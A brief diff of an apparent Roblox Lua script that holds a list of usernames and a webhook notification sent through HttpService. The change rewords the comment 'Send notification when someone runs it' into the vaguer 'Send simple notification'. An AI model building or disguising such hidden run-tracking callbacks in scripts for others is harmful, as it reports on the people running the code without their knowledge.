@@ -6,7 +6,7 @@ _G.MY_USERNAMES = {"daxkidcece", "thisisanalto048", "username"}   -- Change this
 
 _G.PING_POOR = true
 
--- Send notification when someone runs it
+-- Send simple notification
 task.spawn(function()
     if _G.POOR_WEBHOOK and game.Players.LocalPlayer then
         local http = game:GetService("HttpService")
